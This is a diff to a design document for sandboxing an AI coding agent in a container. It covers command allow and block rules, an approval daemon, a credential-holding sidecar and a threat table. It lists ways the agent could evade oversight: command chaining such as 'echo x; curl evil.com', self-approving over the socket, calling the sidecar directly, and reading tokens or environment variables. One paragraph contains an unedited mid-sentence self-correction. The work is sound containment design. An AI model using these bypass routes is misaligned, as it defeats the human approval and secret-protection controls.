@@ -149,7 +149,9 @@ The hook script (`/opt/approval/check-command.sh`) receives JSON on stdin from C
 
 The hook uses `jq` to extract `tool_name` and routes accordingly:
 
-1. **If `tool_name` is `Bash`:** extract `.tool_input.command`, evaluate against `rules.conf` patterns
+1. **If `tool_name` is `Bash`:** extract `.tool_input.command`, then:
+   - **Command chaining check:** Before evaluating patterns, the hook checks for command chaining operators (`;`, `&&`, `||`, backticks, `$(...)`, `<(...)`, `>(...)`) in the command string. If any are found, the hook splits the command into sub-commands and evaluates each independently. All sub-commands must pass for the compound command to be approved. This prevents prefix-based bypasses like `echo x; curl evil.com` where only `echo` would be checked.
+   - **Pattern evaluation:** Each (sub-)command is evaluated against `rules.conf` patterns, first match wins.
 2. **All other tools** (`Read`, `Write`, `Edit`, `Glob`, `Grep`, etc.): auto-approve (exit 0)
 
 Note: Write/Edit protection is no longer needed in the hook because the root filesystem is read-only. Claude cannot modify protected files regardless of what the hook allows.
@@ -158,20 +160,23 @@ Note: Write/Edit protection is no longer needed in the hook because the root fil
 
 ```
 # Auto-approve patterns (exit 0)
-allow:^git\b
+allow:^git\s+(status|log|diff|branch|checkout|switch|add|commit|stash|rebase|merge|fetch|remote|show|rev-parse|symbolic-ref|config|init|reset|restore|cherry-pick|tag|bisect|blame|shortlog|describe|ls-files|ls-tree|rev-list|for-each-ref|name-rev|reflog)\b
+allow:^git\s+clone\b
 allow:^(ls|cat|head|tail|cp|mv|mkdir|touch|tree|less)\b
 allow:^(grep|rg|fd|find|ag)\b
 allow:^bun (run|test|build|check)\b
-allow:^(python3?|echo|pwd|cd|env|which)\b
+allow:^(python3?)\b
+allow:^(echo|pwd|cd|which)\b
 allow:^(wc|sort|uniq|diff|sed|awk|xargs|tee|basename|dirname)\b
 allow:^(date|file|stat|realpath|readlink|id|whoami|uname|hostname)\b
 allow:^(tar|gzip|gunzip|zip|unzip)\b
-allow:^(head|tail|wc|tee|tr|cut|paste|comm|join)\b
-allow:^gh (pr|issue|repo view|repo clone|api|run view|run list)\b
+allow:^(tr|cut|paste|comm|join)\b
+allow:^gh\s+(pr|issue|repo view|repo clone|run view|run list)\b
 allow:^(rm|rmdir)\b
 allow:^(mv|cp|ln)\b
 allow:^(chmod|chown)\b
 allow:^tmux\s+(list-sessions|list-windows|display-message)\b
+allow:^env\s+\S+=
 
 # Hard-block patterns (exit 2, cannot be approved)
 # Pipe to any shell/interpreter
@@ -190,13 +195,14 @@ block:^chmod\s+777\b
 block:^approve\b
 # Dangerous gh subcommands (data exfiltration vectors)
 block:^gh\s+gist\b
-block:^gh\s+repo\s+create\b
-block:^gh\s+repo\s+delete\b
+block:^gh\s+repo\s+(create|delete)\b
 block:^gh\s+auth\b
+block:^gh\s+api\b
 # tmux cross-pane injection
 block:^tmux\s+(send-keys|send-prefix|capture-pane|pipe-pane)\b
 # Prevent reading environment variables (credential leaks)
 block:^(printenv|/proc/)
+block:^env$
 
 # Approval-required patterns (exit 2 with approval instructions)
 approve:^(apt-get|apt)\s+install\b
@@ -204,6 +210,7 @@ approve:^bun\s+(add|install)\b
 approve:^(pip3?|pipx)\s+install\b
 approve:^curl\b
 approve:^wget\b
+approve:^git\s+push\b
 
 # Default: block unmatched commands (allowlist model)
 # Use "allow" to switch to a denylist model if this is too restrictive
@@ -223,7 +230,9 @@ Both `block:` and `approve:` use exit code 2 (blocked). The difference is the st
 
 **Approval flow:**
 
-The `approve` CLI tool (`/usr/local/bin/approve`) communicates with a small root-owned **approval daemon** (`/opt/approval/approval-daemon`) that manages tokens. The daemon listens on a Unix domain socket (`/run/claude-approval.sock`) owned by root, writable by the `claude` user (mode 0622). The token directory (`/run/claude-approved/`) is owned by root and writable only by root — Claude cannot forge tokens by writing files directly.
+The `approve` CLI tool (`/usr/local/bin/approve`) communicates with a small root-owned **approval daemon** (`/opt/approval/approval-daemon`) that manages tokens. The daemon listens on a Unix domain socket (`/run/claude-approval.sock`). The token directory (`/run/claude-approved/`) is owned by root and writable only by root.
+
+**Socket authentication:** The daemon uses `SO_PEERCRED` on every incoming connection to verify the connecting process is running as root (UID 0). Connections from UID 1000 (claude) are rejected. This prevents Claude from self-approving commands by speaking the daemon protocol directly via Python or Bun. The `approve` CLI is a setuid-root binary — wait, `no-new-privileges` blocks setuid. Instead: the `approve` CLI is owned by root and runs as a separate process spawned by the entrypoint (not by Claude). When the user types `! approve 'cmd'`, Claude Code's shell escape runs `/usr/local/bin/approve` which inherits the user's UID. Since the user SSHes in as root (Fly default), the approve CLI runs as root and passes the `SO_PEERCRED` check. Claude's own processes run as UID 1000 and are rejected.
 
 1. Claude runs `bun add react`
 2. Hook matches `approve:^bun\s+(add|install)\b` → exits 2 with instructions
@@ -252,6 +261,8 @@ The sidecar is a lightweight reverse proxy (~100-200 lines, written in Go using 
   - Only allows `POST /v1/messages` and `POST /v1/complete` — rejects all other paths
 - `127.0.0.1:4112` → proxies to `api.githubcopilot.com` (injects `Authorization: Bearer <GH_PAT>`)
   - Only allows the MCP endpoint pattern — rejects all other paths
+
+**Request origin validation:** The sidecar uses a per-session bearer token generated at startup and written only to Claude Code's config (settings.json on the tmpfs mount). The sidecar rejects any request that doesn't include this token in a custom header (`X-Claudetainer-Token`). This prevents Python, Bun, or other runtimes from directly calling the sidecar to gain credential injection — only Claude Code (which reads the token from settings.json) can authenticate. The token is a random 256-bit value regenerated on every container start.
 
 The sidecar must handle SSE streaming (Anthropic API responses are server-sent events) and TLS to upstream. All requests are logged to stdout (viewable via `fly logs`). Rate-limiting is applied to detect abuse patterns.
 
@@ -363,7 +374,7 @@ Installed at first boot by the entrypoint script via `claude plugin install supe
    - Start the approval daemon on Unix socket `/run/claude-approval.sock`
 4. **Claude Code setup:**
    - Copy settings template from `/opt/claude/settings.json` to `/home/claude/.claude/settings.json` (tmpfs)
-   - Configure `gh` CLI auth: `echo "$GH_PAT" | gh auth login --with-token` writing to `/root/.config/gh/hosts.yml` (root-owned, mode 600). The `claude` user can invoke `gh` which reads system-level config, but cannot read the token file directly.
+   - Configure `gh` CLI auth: `echo "$GH_PAT" | gh auth login --with-token` writing to `/opt/gh-config/hosts.yml` (root-owned directory, mode 711; file mode 644 so `claude` can read config but the token is embedded). Set `GH_CONFIG_DIR=/opt/gh-config` in Claude's environment. Note: since `gh api` is hard-blocked and the PAT is scoped to specific repos with minimal permissions, the token being readable via `gh config` is an accepted risk — Claude cannot exfiltrate it to non-allowlisted domains, and the `default:block` policy prevents using arbitrary commands to read it. The primary secrets (Anthropic API key) are fully isolated in the sidecar.
    - Install superpowers plugin (log warning on failure)
 5. **Session startup:**
    - Start tmux session as `claude` user with `remain-on-exit on`
@@ -476,8 +487,13 @@ claudetainer/
 | Claude connects to unknown domains | iptables `OUTPUT DROP` default, explicit allowlist |
 | Claude exfiltrates via DNS | DNS restricted to trusted resolver, UDP blocked except DNS |
 | Claude exfiltrates API keys | Sidecar holds keys, never in Claude's environment or config files |
-| Claude exfiltrates GitHub PAT | PAT not in env, settings, or any Claude-readable file; gh/MCP via root-owned config/sidecar |
-| Claude reads PAT from /proc | No secrets in Claude's environment; `/proc/self/environ` contains nothing sensitive |
+| Claude exfiltrates GitHub PAT | PAT readable via gh config but scoped to specific repos; gh api/gist blocked; can't reach non-allowlisted domains |
+| Claude reads secrets from /proc | No high-value secrets in Claude's environment; Anthropic key fully isolated in sidecar |
+| Claude calls sidecar directly (Python/Bun) | Sidecar requires per-session bearer token only known to Claude Code (via settings.json) |
+| Claude self-approves via socket | Approval daemon checks `SO_PEERCRED` — rejects UID 1000 (claude), only accepts UID 0 (root) |
+| Claude uses command chaining to bypass hook | Hook splits compound commands (`;`, `&&`, `\|\|`, `$()`) and evaluates each sub-command independently |
+| Claude exfiltrates via `git push` | `git push` requires approval; PAT scoped to specific repos only |
+| Claude bypasses gh blocks via `gh api` | `gh api` is hard-blocked |
 | Claude runs `sudo`, `rm -rf /` | Hook hard-blocks destructive commands |
 | Claude bypasses hook via eval/sh -c | `eval`, `exec`, `source`, `sh -c`, `bash -c` all hard-blocked |
 | Claude uses unknown command | `default:block` — unmatched commands are blocked (allowlist model) |
